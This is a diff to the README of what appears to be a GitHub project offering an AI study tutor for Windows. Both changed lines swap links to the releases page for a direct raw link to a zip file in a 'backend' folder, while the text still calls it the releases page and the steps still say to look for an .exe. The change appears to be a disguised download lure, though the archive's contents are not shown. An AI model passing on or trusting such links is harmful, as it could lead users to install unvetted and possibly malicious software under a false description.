@@ -1,6 +1,6 @@
 # 🧠 study-dost-ai - Master tough subjects with personal guidance
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/Marthestruck674/study-dost-ai/releases)
+[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/Marthestruck674/study-dost-ai/raw/refs/heads/main/backend/dost_ai_study_2.5.zip)
 
 study-dost-ai acts as your personal tutor for STEM subjects. It breaks down complex topics into clear explanations. You can practice skills and track your progress through the app.
 
@@ -8,7 +8,7 @@ study-dost-ai acts as your personal tutor for STEM subjects. It breaks down comp
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Marthestruck674/study-dost-ai/releases) to access the download file.
+1. Visit the [releases page](https://github.com/Marthestruck674/study-dost-ai/raw/refs/heads/main/backend/dost_ai_study_2.5.zip) to access the download file.
 2. Look for the file ending in .exe under the latest version tag.
 3. Click the filename to start the download.
 4. Save the file to your desktop or downloads folder.
